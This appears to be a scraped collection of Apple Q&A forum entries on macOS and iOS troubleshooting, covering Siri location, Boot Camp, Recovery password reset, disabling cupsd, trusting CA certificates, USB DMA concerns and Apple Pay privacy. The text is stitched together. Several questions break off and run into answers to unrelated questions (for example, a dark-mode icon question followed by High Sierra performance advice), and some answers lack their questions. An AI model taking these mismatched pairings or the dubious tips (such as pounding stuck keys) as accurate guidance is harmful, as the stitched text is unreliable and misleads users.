\n\n*Photos\n\n*Reminders\n\n*Siri\n\n*Specht\n\n*TV provider\n\n", "Q: Siri unable to determine my location despite location services enabled Specs: MacBook Pro Late 2012 running macOS High Sierra\nI am trying to ask Siri to tell me what the weather is in my current area, but apparently Siri is saying that it doesn't know where I am, despite having location services enabled.\nI tried disabling and re-enabling Location Services for Siri through System Preferences, but that didn't seem to fix anything, and Siri said the same thing: \"could not determine your location.\"\nThen, I disabled Location Services itself, but when I re-enable it, Siri still can’t tell me where the Mac is.\nMy timezone is also correct, but Maps isn't able to determine my current location either.\nWhat are next steps in fixing this?\nEDIT - Already fixed this by installing the latest macOS update.\n\nA: Signing into iCloud and turning on both Bluetooth and Wi-Fi ensures that your Mac has the best chance of finding its location.   I believe that if you sign into iOS devices that happen to have GPS or location services working, your Mac might be smart enough to figure out where it is based on sharing the same Internet connection in proximity, but I am not sure. \nThe primary way that location is determined as if Apple knows the IP address you are reaching so be sure you turn off all VPNs and get on as open a network is you can initially. The second way is trilateralization from known WiFi access points that your WiFi can see. You don’t have to join those networks, but you need a viable network connection back to Apple. \n", "Q: Is the used vulnerability closed after a jailbreak? If a vulnerability is used to jailbreak an iPhone or iPad, is that vulnerability typically closed/fixed as part of the jailbreak (itself, or a recommended next step) ?\nIn other words: if a new release of iOS fixes a security hole, then can the user have that hole fixed on his device while keeping an older version of iOS (jailbreaked)? Or is it a choice: either the pros of jailbreak (but with a known vulnerability) or no vulnerability (and newer iOS), but no jailbreak?\n\nA: Jailbreaking doesn't immediately make older iOS immune to vulnerabilities with newer iOS, but it has been possible to install tweaks which protect against certain exploits.\nThese might not be the same implementations as with the newer iOS, but serve to protect against specific exploits. For example, SpectrePatch is a jailbreak tweak for older versions of iOS to protect against Spectre.\nA survey of a broad range of security professionals would be iOS devices are less secure when jailbroken. \n\n\n*\n\n*https://www.tomsguide.com/us/iphone-jailbreak-risks,news-18850.html\n", "Q: How to make Bootcamp 4 work in Windows 8.1 on unsupported MacBook Air 1,1 I recently installed Windows 8.1 on my Macbook 1,1. It had previously run Windows 10 which worked fine at first but began to give problems with each major update until version 1709 stopped the trackpad working properly. \nI then experimented with Ubuntu and Linux Mint, trying to find a modern, supported OS that worked OK on this 1.6 GHz Core 2 Duo machine with only 2GB of soldered-in RAM. \nWindows 8.1 immediately installed and runs better than the latest version of Windows 10 on this machine but when I tried to install Boot Camp I got the message that I was using an unsupported machine, even when I used compatibility mode. \nI know I can install Windows 7, then Boot Camp and then upgrade to 8.1 but is there any other way of forcing  Boot Camp to work? It is useful for configuring the Mac keyboard and to use multi-touch on the trackpad, even though most of the hardware drivers have now been installed separately anyway.\n\nA: I fixed this issue by right-clicking the setup.exe file in Bootcamp and choosing \"Properties\". I set the compatability setting to \"Windows Vista Service Pack 2\" and ran it as administrator. I got a compatability warning but chose to run program anyway. The Bootcamp program ran, installed all the drivers and (importantly) the Boot Camp option on Control Panel. Meaning that the keyboard is now the correct UK Apple version and the trackpad has tap to click and I can right click by tapping both fingers. This old MacBook Air is actually pretty usable on Windows 8.1 and its supported until 2023!\n", "Q: MacOS user password no longer working I just got a new iMac and after going through setup it no longer seems to recognize my password. I was stuck outside my account so I reinstalled using recovery hoping it would reset everything including user information but I still get prompted for my initial password. I wonder if this is happening because I changed the username to lowercase at one point and somehow the change didn’t properly register in the OS? Anyway, is there any way around this problem? \n\nA: Resetting User Account Password - This will work so long as you do not have a firmware/'EFI' password set on the machine. \n1) Boot into your Recovery Partition holding down command + R at the startup chime\n2) Select Terminal from your Utilities Menu Bar\n3) Type the following bolded command in: resetpassword\n4) From the new window that appears, select your user account and proceed.\n5) Type in the new password and confirm the new password\n6) Click Save, close this pane and quit Utilities\n7) Select your boot volume when presented with \"choose startup disk\" and reboot your machine\n\nA: It sounds like you have Filevault encryption turned on. That's the only way it should be asking for an old password after reinstalling the OS. You should boot into recovery mode, open Disk Utility, and reformat the drive, making sure it is NOT encrypted. Then reinstall the OS and it should be fine. \n", "Q: How to scrobble to last.fm from YouTube played via Apple TV? I got some rad new sonos speakers and hooked them up to my TV. So naturally I'm now playing more music videos on YouTube. But Last.fm isn't picking up these scrobbles. Bummer!\nWhat can I do to make sure I'm tracking these plays in Last.fm?\n\nA: If you're using an app this won't help, but if you're just using a web browser I recently released ScrobYou. It lets you search for and watch music videos from YouTube and scrobbles what you watch all in one simple webpage\n", "Q: How to play a video at 200% zoom on Mac? Is there a way to play a video at 200% zoom on Mac with builtin programs like Preview or Quicktime?\nOr do you need to install a third party video player like VLC?\n\nA: While there isn't any option to set a precise zoom value for a video playing in QuickTime, you can still zoom the video using various means:\n\n\n*\n\n*Increase Size command under View menu. Invoking this zooms the video in fixed increments.\n\n\n\n\n\n\n*Fit to Screen command under View menu. Invoking this fits the video to match with screen width/height.\n\n\n\n\n\n*Zoom command under Window menu. This command works similar to Fit to Screen command.\n\n\n\nIn addition to above, a QuickTime or quick look preview window can be freely resized with the help of resizing handles to manually adjust zoom.\n\nA: Turns out the simplest way to zoom in on a video beyond \"fit to screen\" is to use the Mac OS builtin Accessibility Zoom feature. I could not find any application that could do it (Finder Preview, Quicktime, VLC, MPV).\nGo to System Preferences > Accessibility > Zoom to see your keyboard/mouse shortcuts. For example, on my system I can use ctrl + 2 finger trackpad scroll to zoom in/out. Or opt + cmd + =/- with the keyboard. After you zoom in, you can use the mouse to pan around.\n\nA: This doesn't exactly answer your question, but another useful tip is that you can view videos full size by opening them in your browser of choice.  I rarely need to view a video at more than 200% as I wouldn't get to see any more detail.  But an annoying limitation of QT and most video players is that even if you have a high res video you can't view it at a higher resolution than your screen.  If you open it in a browser though, you can reverse pinch to zoom in to full size.  To view a local video in chrome, press cmd + o on your keyboard then use the dialog to browse and select the video you want to open.\n", "Q: iPhone: How to ensure iBook files are stored locally There was a bug in iBooks.

E.g, do I use the .scap file matching the Mac model and rename that to Firmware.scap, whereas a model-matching .fd file (which may be optional) then goes into the FIRMWARE folder?\n\n*Is EfiUpdaterApp2.efi needed to run the firmware, or is that only a leftover from an older firmware update process and can be removed?\n\n*Can I create a universal EFI boot partition, containing the firmware for any Mac model, so that I can put that onto an external disk and boot practically any Mac from it for which I've included its .fd or .scap file?\nUpdate\nThis answer suggests that the files in the FIRMWARE folder are not loaded when booting the system but are rather just used to flash the ROM. So, if the particular Mac had already installed the particular file into its Flash ROM once, it won't be needed any more and can be removed from the EFI partition.\nI also did a test where I renamed the top \"EFI\" folder to \"EFI-OFF\" and rebooted a MacBook Air 2015. This resulted in a new EFI folder being created in the EFI partition with the same Firmware.scap file. This suggests that neiter files need to be present at boot time at all, at least on recent Macs. Meaning there's no need to create a bootoable EFI partition at all. I wonder if it still may contain additional support for Macs whose boot ROMs can't be updated, such as adding support to boot from APFS volumes, perhaps.\nBackground:\nRecently, a friend got his EFI boot partition overwritten, whereas his main Mac boot partition had remained intact. Without this EFI partition, the Mac would not boot any more.\nI then tried to repair the damage by copying my Mac's EFI partition to his Mac, using iBored (which I wrote myself, so I know what I was doing, trust me on that).\nBut that did not help - the Mac would still not boot.\nAfter a while I figured that his rather old Mac (a MacBook Pro early-2009) probably required a different EFI firmware than the other Mac from which we tried copying the EFI firmware.\nAfter some digging I found the mentioned .fd and .scap files in a macOS installer, which appears to prove my theory. Hence I would now like to get some more information on how this all fits together.\n\nA: macOS will boot fine without an EFI partition. Unlike most operating systems, macOS stores its boot files inside the OS partition. Apple computers ship with firmware that can read HFS+ partitions (2016 and later models can read APFS volumes as well by default), so they can read the boot.efi file from the partition. When you upgrade your computer to High Sierra, the firmware gets upgraded as well, getting the ability to boot from APFS partitions.\nYour friend probably did more than just overwriting the EFI partition. You will probably need to backup your data and reinstall macOS.\n", "Q: Trackpad cursor moving around on its own and clicking anywhere I own a Macbook Pro Late 2011 model and recently the trackpad's cursor is behaving weirdly - it moves around on its own and it clicks anywhere.\nI am guessing I need to change my trackpad ?\nlink\nWill the trackpad on above link help me ? Do I need to check model number A1278 ?\nor just 'Mid-2009--Mid-2012' is good enough to assume it will work with my laptop.\n\nA: To answer your question, the part you linked should work with your MacBook Pro. Before purchasing a new trackpad, I would suggest you try a few troubleshooting steps.\n\n\n*\n\n*Reset the SMC\nResetting the SMC can resolve some problems on a Mac, particularly hardware issues.\nPossibly using an external mouse, shut down your Mac.  Then hold the shift, control and option keys along with the power button. After holding these keys for 10 seconds, let go of them and power on your Mac normally. If this does not help, try using Safe Boot.\nYou can find out more about resetting the SMC here: How to reset the System Management Controller (SMC) on your Mac\n\n\n*Safe Boot\nIn this case, you wouldn't want to stay booted into Safe Mode, but you can still benefit from what Safe Mode does to narrow down the source of the issue. According to Apple, Safe Boot does the following things:\n\n  \n*\n  \n*Verifies your startup disk and attempts to repair directory issues,    if needed\n  \n*Loads only required kernel extensions\n  \n*Prevents startup items and login items from opening automatically\n  \n*Disables user-installed fonts\n  \n*Deletes font caches, kernel cache, and other system cache files\n\nTo boot into Safe Mode, first shut down your Mac. Then press the power button to power on your device while holding the left shift key on the internal keyboard. Once you see either the login window or your desktop, you can reboot the Mac normally\nJust verifying the startup disk and clearing caches can be helpful. I had a very similar case, even with a similar model Mac, where this resolved the issue. If the issue only occurs outside of Safe Mode, then that is also helpful to know.\nIf that doesn't work\nIf neither of these things resolve the issue, then I would suggest you take your Mac to an Apple store for a repair estimate. If you would rather perform the repair yourself, the linked part should be compatible with your Mac.\n\nA: The trackpad of my old Sony laptop sometimes behaved weirdly too. In my case, the reason was dirty and oily surface. It always disappeared after wiping with soap and then with water (be careful!).\n\nA: For those stumbling across this question with similar issues, I'm adding a few other things to check for:\n\n*\n\n*MacBooks/iBooks: A battery that is starting to inflate may be exerting pressure from below. Usually this can be felt by trying to click the trackpad - does it click early, not at all, give some weird resistance to pushing?\n\n*Dirt along the edges of the trackpad, or moisture may cause weird behaviour as well. Cleaning with alcohol while the device is switched off is worth giving a try. Make sure there is no liquid left from the process when switching on again. (Alcohol residues fade a lot quicker than moisture)\n\n*Are there any other devices that could be malfunctioning or having side effects? I've had a wacom tablet hidden under some paper and the pen beloging to it hapharzadly tossed on top. Did work s designed, and kept dragging the cursor to the pen-position. Took embarrasingly long to discover! (Booted into safe mode, then checked what would have been running and might have the potential of disrupting mouse action.)\n\n\nA: For me, I think it was because of atmospheric conditions. I later kept my laptop in a Air Conditioned room for a night and it started working. I tried everything but at last it started working after being cooled in Air Condition.\n", "Q: Where is the folder icon of dark mode located?

I I have a macbook pro 2012 15\" i7 (quad core) with a SSD drive and 16G RAM. Last night I've updated from Sierra to High Sierra and I've noticed that everything seems to be kind of slow. Before the upgrade everything run snappier than now on High Sierra. I just upgraded from the mac app store and not a fresh install of it. \nShould I run a fresh install in order to get a better performance?\n\nA: No - High Sierra isn’t generally slower than Sierra so there’s likely something else going on.\nI like your suggestion to run a fresh install. That’s almost always the fix when a system gets slower and slower and even a fresh install of the same OS as you have running for 6 months to 2 years straight often makes everything snappy and you happy again.\nI’d do one last backup and erase install High Sierra and migrate the data back.

I have a Macbook pro 2016 and keys keep getting stuck. By \"stuck\" I mean that pressing them doesn't do anything anymore unless I press them really hard. The recommended way is to blow air into the keyboard while holding it at a certain angle. I never have a can of air laying around, and blowing with my mouth doesn't seem to work. Is there a different way?\n\nA: I found another way that seems to work and doesn't require a can of air: Hold the laptop sideways and while holding it like that, pound on the key. Pound as hard as you would if you were typing an angry message. Try to pound on each side of the key. Holding it sideways gives gravity a chance to pull the crumbs out. And if it doesn't work the first time, try holding it a different direction.\nI've tried this method on several keys, including the large right SHIFT key. It seems to work pretty good.

Just bought a new 500GB Samsung T5 external SSD, and the first time machine backup is seems like an inside joke. The majority of the time it's backing up at a crawl < 1 MB/sec, but occasionally jumping to to 10-20 MB/sec. Estimated time remaining is 20 hours.\nAccording to USB 3.0 speeds, 625 MB/sec is upper limit. I understand this speed will, most of the time, not be achieved because of files in non-consecutive memory locations and controller performance etc, but shit I'd expect to see at least something like 100 MB/sec or larger. Is this a reasonable expectation? Is it possible I just have zillions of tiny files in impossibly distant memory locations? Or that I unluckily got a bad T5?\nI'm running on Sierra 10.12.6 and I disabled throttling with \"sysctl debug.lowpri_throttle_enabled=0\" and have no other apps running.\nAny suggestions for getting typical USB 3.0 write speeds? \n\nA: Initial Time Machine backups do take a long time compared to subsequent backups. How long the first backup takes will depend on a number of factors, some of which you've already covered in your question.\nAs for your exact situation, it is possible that you have a faulty T5, but it's not the most likely option.\nI've used a few of these drives on various Macs and have found them to be very fast, but in all cases they're connected to a USB-C port (not a legacy USB 3 port).\nThe first things I'd do is test the T5 by transferring only a few large files (e.g. a few movie files so that you're transferring about 5GB or so of data). I would then repeat the test, but with the T5 connected to the other USB port of your MBP.\nThe above tests should result in one of the following results:\n\n\n*\n\n*transfer speeds anywhere between 100 MBps to 200 MBps on both USB ports\n\n*transfer speeds anywhere between 100 MBps to 200 MBps, but only in one USB port\n\n*transfer speeds still at a very low level, regardless of port\n\n\nIf you're getting transfer speeds you're happy with from both ports, then you know that your lack of speed is nothing more than the initial Time Machine backup having to process/copy a lot of files.\nIf you're getting transfer speeds you're happy with from only one port, then you know you have a problem with one of your ports and you should use the other for your Time Machine backups.\nIf you're not getting good transfer speeds regardless of the port, then further troubleshooting is warranted to isolate whether it's an issue with your MBP or your T5.\nLet me know how you go.\n\nA: Please refer to http://osxdaily.com/2016/04/17/speed-up-time-machine-by-removing-low-process-priority-throttling/\nIt might improve, though might not be as fast as you expect.\n", "Q: MacBook Pro 2016 Display has faint horizontal line in 3/4 of screen I am suddenly starting to see this faint horizontal line in 3/4 of the screen and the Dock area, especially on dark colors and blue.

I found an AppleScript example on a website that I want to use, and the example is rendered as text in the browser (vs., say, being a suitably formatted file to download).\nTo use this AppleScript, I'm assuming that I need to use Automator somehow to create a Workflow (or perhaps an Application), but I can't figure out the right way to paste the AppleScript (or otherwise enter free-form text) into Automator.\nI tried dragging a Run AppleScript action into the workflow window and then pasting the the AppleScript there, and (after I cleaned-up the smart quotes) I was able to use the Run button to execute it from within Automator. Though it popped up a warning about not receiving input while running inside Automator, the AppleScript seemed to execute correctly (i.e., I ended up with the right result). But it seems like this might not be the correct/efficient way to do this transcription (and/or it will result in an inefficient AppleScript).\nIs there some way to open a free-form text window in Automator to type in an AppleScript?  Or is there some other way (other than trying to figure out each Action to drag into the workflow window and modify accordingly) to transcribe an AppleScript?\nCorroborating my suspicions of inefficiency, I see that the resulting Application bundle/directory has a file called Contents/document.wflow and within that is the free-form pasted text as an ActionParameters member of Run AppleScript -- and this presumably will need to be parsed at every runtime. \nI'm using Automator 2.7 on MacOS 10.12.6\n\nA: You might be making this more complicated than it needs to be. If you want the code from the other site in an applescript, that page provides guidance. You don't need Automator to simply run that script.\nCopy the script text onto the clipboard. Launch the Script Editor. It should open a new and empty document. Paste the copied script. The text should appear as whatever your default is for new (or uncompiled) text, e.g. probably in a purple monospaced font.\nConfirm that everything is hunky dory by compiling the script: Type Command-K (or from the menus: Script > Compile). It should take on the same appearance as what you saw on the other site, e.g. some words coloured or bolded (emboldened?). Depending upon whatever, you may find that the quotation marks have been altered and you get an error. They need to be straight double quotation marks, e.g. \"\" and not “”.\nThen try it out. If it works as desired, save it somewhere easy to access, e.g. the Safari scripts folder. Then, if you have the Script menu enabled (check the box in the Script Editor General preferences), you will be able to run the script from the script icon that shows up on the right end of the menu bar (near the clock) whenever Safari is the active app.\n/Users/username/Library/Scripts/Applications/Safari\n\nNB I'd suggest saving it as a script (as opposed to application) unless you have a specific need that requires that.\n\nA: I found that just copy / paste into a new automator window then save worked for me\n", "Q: How to open a Zoom link in a non-browser app without being prompted? URLs have long been the domain of web browsers, but some apps challenge this assumption by asking your browser to open a link in their dedicated app.\nProblem: Safari Keeps Asking Permission\nFor example, I use Zoom.us, a videoconferencing service. They give me a link associated with my conference call that's easy to throw into a calendar invite, like https://ibm.zoom.us/j/9747900418.

On my iOS 11.x device I've enabled iMessages in iCloud.  When I back up my device locally via iTunes, are my iMessages still included in that backup?\n\nA: Your messages will be backed up if stored on the device you are backing up. For example, if you are backing up A and the messages are stored on B, it won't back it up.\nA backup is recommended as if you loose your messages on all devices they will be lost.\n\nMessages in iCloud are updated automatically, so you always have the same view everywhere you use iMessage. When you delete a message, photo, or conversation on one device, it’s removed from all of your devices. And since all of your attachments are stored in iCloud, you can save space on your device.\n\n(Source)\n\nA: Your messages will be backed up to iCloud if you back up the device that has the messages! For example....you have important messages on iPhone A and you just bought a new iPhone (iPhone B). You want the messages from iPhone A to be put on iPhone B. In order to do this you need to do an iCloud backup on iPhone A and then do a “Restore from iCloud Backup” on iPhone B! Does this make sense?\nEDIT: I didn’t realize you were talking about an iTunes backup, but it is essentially the exact same concept, just with iTunes instead of iCloud! My mistake!\n\nA: Best way to check and make sure - crack open the iTunes backup. \niPhone Backup Browser is the original, now abandonware, but you have other options, like iBackup Viewer, iPhone Backup Viewer, and the good folks at iMazing do a utility. \nThe utility would you usually present backup files in a human-readable way, so you'd know where messages are. \nOn older iOS (and on newer ones to some extent) simply moving SMS.db from one device to the other was enough to get your messages\n", "Q: iMessage to Android phones over WiFi What free WiFi app can I download onto my iPhone 7 so I can text Android phones and call them using iMessage over WiFi with no cell phone service? For can someone tell me how to do be able to call and text Android phones using iMessage \n\nA: iMessage is Apple’s proprietary messaging service. There is no other cross-platform app that supports it. iMessage does not support calling as it is only a text messaging service. It provides its own peer-to-peer messaging that is available only to users of macOS, iOS (and by extension to watchOS). It also supports SMS for communication with non-Apple devices. Cellular calls can made using the iPhone’s phone app and calls to Macs and other iOS devices can be made with FaceTime app. iMessage is integrated with both, but does not do the actual calling.\nIf you have no cellular service, it is not possible to contact an Android device with iMessage, as it can only contact Android devices using SMS. (iMessage can text and call iOS devices with just Wi-Fi however).\nYou could choose other services that are available on both iOS and Android such as WhatsApp, Google Hangouts, or Google Allo. Generally, both devices must have the same app installed for communication between them.\n\nA: You could turn on Wi-Fi calling and then your phone will use Wi-Fi to send regular messages. This could be the solution if your problem is merely that you don’t have cellular service available. \nGo to Settings -> Cellular -> Wi-Fi calling\nThis will require a carrier that has WiFi calling enabled such as AT&T or Verizon. \n", "Q: Best way to turn off cupsd?

This stops the service.\nAfter that,\nsudo launchctl remove /System/Library/LaunchDaemons/org.cups.cupsd.plist \n...will ensure that cups does not come back after a reboot.\nI don't know how OS X will react if you try to leave cups unloaded in the long term.  Also, I am nearly certain that major (and likely some minor) OS updates will \"correct the issue\" and reload cups for you.   So helpful. \nLast, you can check to see what services are currently running by using sudo launchctl list\n\nA: The correct command, especially with macOS Catalina, to permanently disable cups is:\nsudo launchctl unload -w /System/Library/LaunchDaemons/org.cups.cupsd.plist\n(The currently accepted answer states launchctl remove /System/Library/LaunchDaemons/org.cups.cupsd.plist but in fact that doesn't do anything other than fail silently with an error return code)\n", "Q: Failed to verify installESG.dmg on install mountain lion Have a mid 2012 Macbook pro that last week wasn't able to find the drive to boot from (just saw the folder with a question mark on booting). When I opened disk utilities from macOS utilities the disk showed errors which couldn't be repaired. At this point I attempted a restore from time machine but this couldn't get past 0.1% after 24 hours for only around 100Gb of data, this led me to believe it was the SSD that has failed.\nI then formatted the drive and tried to reinstall the OS. This just got itself into a loop of failing to download Mountain Lion after 17 hours.

Without putting hands on the actual unit, it would be impossible to tell.\nIn other words, the SMC could be failing to charge the battery or the circuitry that charges the battery could have failed.\nAs far as the battery goes, it's entirely possible it's fine, it's just that it's not being measured properly (0A) given the symptoms.  However, it's not unheard of that a brand new battery with hardly any charge cycles goes bad and no longer holds a charge - it happens.\nAgain, without putting hands on, it would be next to impossible to tell and given the age (3 months), the best thing to do is send it in (mail in  if possible).  \nIt's a hardware issue and there's no getting around this. Firmware and a 3rd party boot loader will not address an issue concerning a chip that is technically supposed to be functional when the power is \"off\".\nHowever, if you are so inclined to, open the back and disconnect the battery for 30 seconds.  That should reset the SMC.\n\nA: I went to an Apple Store and they changed the top case, covered by the warranty, even though I had opened the back to disconnect the battery.\nThey were very comprehensive, and even ordered an US layout keyboard specially for me. I now have a brand new keyboard, trackpad, Touch Bar, USB-C ports, headphone jack and battery.\n", "Q: How to Disable USB 3.0 and USB 2.0 while keeping USB 1.0/1.1 on Mac Mini? Is it possible to disable both USB 3.0 and USB 2.0 support, while keeping USB 1.0/1.1 support, on my 2012 Mac Mini, under OS X 10.13 High Sierra? Perhaps by removing certain kernel drivers while leaving others in-place?\nI need only USB 1.0/1.1 support to allow a simple USB keyboard + mouse to be connected.\nI am concerned about physical hardware-based DMA attacks on my Mac Mini with USB 3.0 ports. (Because USB 3.0 can be used as an avenue for direct access to the Mac's internal PCIe bus.)\n(I will be disabling or physically removing all other interfaces on the device, i.e. epoxying the Lightning and Firewire connectors so they are unusable, epoxying the Mac Mini's case shut so it becomes tamper-evident, removing the 802.11 wifi and Bluetooth boards, etc. I just need a dumb USB 1.0/1.1 port for keyboard, and an Ethernet RJ45 port.)\n\nA: All Intel-based USB host controllers use hardware-based DMA engine to execute linked list of TD (transaction descriptors) from main memory. This is/was true for all three of them, UHCI, EHCI, and latest xHCI. More, in recent Intel platforms the UHCI (which did handle full-speed and low-speed) is now abandoned. \nIn intermediate USB architectures (Sandy Bridge, Ivy Bridge, series 7 chipsets) the only remaining controllers were EHCI and xHCI, which is still an eclectic mix. Funny, it looks like the FS/LS modes are handled via xHCI (USB3) controller if the EHCI controller determines that the attached device is LS or FS, and mark port ownership to \"companion controller\".\nIn recent USB architectures there is only one, xHCI type of controllers, which handles all modes (SS, HS, FS, and LS) uniformly via the same DMA access method.\nSo this is highly unlikely that you can avoid using xHCI USB 3.0 controller if you still want your USB keyboard and mouse.\nYou can try to use a regular HS hub to connect your keyboard and mouse. In this case the traffic will be controlled via EHCI HS controller (if this is C216 chipset), and xHCI can be disabled, if EHCI makes you feel more secure.\n", "Q: How to stop Amazon Prime Day popups My iMac runs High Sierra, and I use Safari. Both are fully updated.\nThis week, I am presented with recurring popups advertising Amazon Prime Day. I have cleared Safari's caches and cookies for all sites Amazon and Prime. \"Block popups\" is checked in Safari > Preferences > Privacy > Manage Website Data. Safari also runs the Safari extension Wipr, which is likewise up to date. Quits-and-restarts, both of the OS and Safari, are unavailing.\nWhile the popups are easily dismissed, they're annoying. Other than these, I don't see popups or ads. \nHave any of you ideas how I might successfully block them, or find their source?\n\nA: Try this:\n\n\n*\n\n*Download & Install AdBlock\n\n*Right click on the popup and select \"Block This Ad\"\n\n\n*Drag the slider until the popup is gone\n\n*Click \"Looks Good\"\n\nNote: Example of blocking Google logo on homepage\n", "Q: Is there an adapter / Dock / hub with 2 display outputs? Looking around I can only seem to find an adapter / dock that only has 1 hdmi output with usb,ethernet, etc.\nAre there any adapters / Docks that have 2 display outputs? So then I can plug it into the macbook pro with thunderbolt 3 and output on 2 displays. without needing to buy 2 of these\nIs it not possible because of the power consumption or speeds?\nThanks!\n\nA: A lots of Thunderbolt 3 docks exists that will allow you to have 2 display outputs. Usually these are organized such that one display is connected to an HDMI or DisplayPort output on the dock, and the other is connected to the chained Thunderbolt 3 port on the dock which is used as a DisplayPort output.\nFor example you could use the Elgato Thunderbolt 3 Dock, the OWC Thunderbolt 3 Dock or the Caldigit Thuderbolt Station 3.\nNote: Before you rush out and buy any of these make sure that you actually have got a Thunderbolt 3 enabled MacBook Pro or similar. Your question contains conflicting information as you claim to have a MacBook with Thunderbolt 3, which doesn't exist.

Previously, this was limited to accounts created in iOS 10.3 or macOS Sierra 10.12.4 and later.\nPlease refer to the Apple Support Document, Two-factor authentication for Apple ID for technical details regarding Two-Factor Authentication.\n\nCan I turn off two-factor authentication after I’ve turned it on?\nIf you already use two-factor authentication, you can no longer turn it off. Certain features in the latest versions of iOS and macOS require this extra level of security, which is designed to protect your information. If you recently updated your account, however, you can unenroll for a period of two weeks. Just open your enrollment confirmation email and click the link to return to your previous security settings. Keep in mind, this makes your account less secure and means that you can't use features that require a higher level of security.\n\n\nA: \nWhat if I use two-factor authentication on a device running older software?\n  If you use two-factor authentication with devices running older OS versions—like an Apple TV (2nd or 3rd generation)—you might be asked to add your six-digit verification code to the end of your password when signing in. Get your verification code from a trusted device running iOS 9 and later or OS X El Capitan and later, or have it sent to your trusted phone number. Then type your password followed by the six-digit verification code directly into the password field.\n\n(from the Apple Support page Two-factor authentication for Apple ID)\n", "Q: iOS - Recovering data from device after reset I would like to give away my 1st Generation iPad. If I reset it by selecting Reset All Content and Settings, would it be possible for someone to restore the data (passwords, photos, etc.) which are currently on it?\nWould it be possible to install some kind of restore or data rescue application and restore the data?\n\nA: If the new User do not have to password for your appleID or an iTunes Backup, he'll not be able to restore any of your data after the iPad have been wiped.\n\nA: No. Generally it won't be possible to recover data from the iPad for someone else, once you have unlinked it from your Apple ID and erased it by selecting Reset All Content and Settings.\nThe data can be restored on the device by restoring from a backup from either computer or iCloud.\nHowever, as you looking to give it away to a 3rd party, it is recommended to go through the instructions outlined in the Apple support document, What to do before you sell or give away your iPhone, iPad, or iPod touch and follow each applicable steps.\n", "Q: How to develop an an automator for looking up words in Google dictionary If you type the following address in your browser's address bar, google will give you a dictionary for looking up words:\nhttps://www.google.com/search?sa=X&biw=1440&bih=737&q=Dictionary#dobs=\nIf you add a new word like \"hi\" right after the equal sign at the end of the above link, it will give you a definition for it.\nI am just thinking if I could make an apple automator app with an interface which asks for the new word, and retrieves the definition from the oxford dictionary presented by google.

These usually contain an original Apple LCD with a copy glass on top. The various innards, such as backlight, touchscreen, flexes etc. will vary from original to copy depending on the supplier. You also want a replacement screen that was assembled with a cold-glue process (like Apple does) as opposed to a hot-glue process (yes, THAT hot glue!).\nOf course, if you want a true original screen, then the options are Apple Store or buy a used device. However, keep in mind that the used device you buy may also have an aftermarket screen as probably 25% of phones suffer screen damage at some point in their life. \n", "Q: How does one remove FUSE from a MacBook? \nHow do you remove FUSE?

In this case the trusted URL is set to https://BrainTreeOrStripe.com/.well-known/apple-developer-merchantid-domain-association\n\n*A shoe vendor acts as an Apple Pay Merchant, and the above URL points to their own website (Payless.com)\n\n\nIn the above examples some information identifying the user is shared with some parties and not others.\nMy question is regarding PII (Personally Identifiable Information) or even a  per-user tracking identifier that may exist. I'd like to know when any of that data is shared between the merchant, the payment network, and/or other parties.\nA risky example shows itself when I use ApplePay with two different merchants (medical processing and a nightclub), and that data is subsequently  correlated by two merchants willing to share data or perhaps it's observed on the payment network itself.  My fear is that insurance rates will rise simply because I'm buying drinks for friends at a nightclub, but the data makes it appear that I'm buying all those drinks for myself.  \n\nA: Apple Support Document, Apple Pay security and privacy overview, throws some light on the security and privacy offerings when using Apple Pay on Web.\nRelevant quote from the article:\n\nWhen you use Apple Pay within apps or on the web\n...\nTo securely transmit your payment information when you pay in apps or on the web, Apple Pay receives your encrypted transaction and re-encrypts it with a developer-specific key before the transaction information is sent to the developer or payment processor. This key helps ensure that only the app or the website that you’re purchasing from can access your encrypted payment information. Websites must verify their domain every time they offer Apple Pay as a payment option. Like with in-store payments, Apple sends your Device Account Number to the app or website along with the transaction-specific dynamic security code. Neither Apple nor your device sends your actual payment card number to the app.\n...\nWhen you use Apple Pay on your iPhone or Apple Watch to confirm a purchase from your Mac in Safari, your Mac and the authorizing device communicate over an encrypted channel via Apple servers. Apple doesn’t retain any of this information in a form that personally identifies you. You can disable the ability to use Apple Pay on your Mac in Settings on your iPhone.

If not then continue below.\n\nDoes your work MacBook have any work-installed profiles in your system preferences? \nA lot of times companies don't allow certain features to be accessed. If there is a profile or a preference there that isnt a default preference then it was installed. \nIf you don't have any profiles or special preferences then I would check to see if you can access www.icloud.com and see if you can visit the site on your work MacBook. If you can then great, if not then its likely that the server is blocked, which means that it is either blocked from the network. \nIf none of the above apply, then there are 2 things that you can do to test and see if its a software issue.\n\n\n*\n\n*Sign out of iCloud and then sign back in and see if the issue continues.\n\n*Try it in safe mode to see if there is something else that could be preventing it.\n\n*Create a new user account on that MacBook and sign into iCloud with the same Apple ID account.

To add a CA certificate locally, launch Terminal and run this command (I've broken it down into several lines to make it more readable, but the command is fully functional):\nsudo security add-trusted-cert \\\n-k /Library/Keychains/System.keychain \\\n-d /path/to/CAcertificate.crt\n\nwhere:\nsudo runs the command that follows with administrative privileges (type your login password when requested)\nsecurity is a utility to manipulate keychains\n-k specifies which keychain to use (run security list-keychains to get a list of available keychains). Note that new root certificates should be added to the login keychain for the current user, or to the System keychain if they are to be shared by all users of this machine, because the System Roots keychain cannot be modified. In the example above, I use the System keychain. \n-d adds the certificate to the admin cert store (so that the user doesn't have to authenticate via an authentication dialog)\n/path/to/CAcertificate.crt is the path to your CA certificate.

You should try to reinstall the operating system.\n", "Q: Power consumption of iMac All other things being equal, what is the difference in power consumption of iMac with 8GB of RAM and iMac with 16 GB RAM?\n\nA: It depends on which model of iMac it is as the various models have differents types of RAM - for example DDR2, DDR3, LPDDR3 and LPDDR4. In particular make note that some models use LPDDR RAM, where the \"LP\" stands for Low-Power.\nThe latest mid-2017 iMac uses PC4-19200 DDR4 SO-DIMM RAM modules. Here the difference in power usage between 8 GB and 16 GB is approximately 3 watts.\nThe difference between in power usage in having 1 x 16 GB, vs 2 x 8 GB, vs 4 x 4 GB modules is negligible.\nNote that the mid-2017 27\" iMac consumes about 217 watts when the CPU is maxed out, so the RAM power usage is very small compared to the rest of the system.\n", "Q: How to count the number of files and folders in iCloud Drive?

